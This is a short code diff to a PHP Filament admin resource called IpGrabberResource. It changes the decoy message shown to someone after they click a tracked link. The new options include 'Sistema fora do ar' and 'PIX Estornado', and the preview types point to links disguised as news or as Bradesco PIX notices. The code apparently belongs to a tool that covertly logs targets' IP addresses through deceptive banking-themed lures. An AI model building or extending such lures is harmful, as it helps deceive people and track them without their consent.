@@ -140,10 +140,11 @@ class IpGrabberResource extends Resource
                     Forms\Components\Select::make('mensagem')
                         ->label('Mensagem exibida ao clicar')
                         ->options([
-                            'Este documento não está mais disponível.' => 'Este documento não está mais disponível.',
-                            'Acesso expirado.' => 'Acesso expirado.',
+                            IpGrabber::DEFAULT_CLICK_MESSAGE => IpGrabber::DEFAULT_CLICK_MESSAGE,
+                            'Sistema fora do ar' => 'Sistema fora do ar',
+                            'PIX Estornado' => 'PIX Estornado',
                         ])
-                        ->default('Este documento não está mais disponível.')
+                        ->default(IpGrabber::DEFAULT_CLICK_MESSAGE)
                         ->selectablePlaceholder(false)
                         ->required()
                         ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'pix_bradesco'], true))
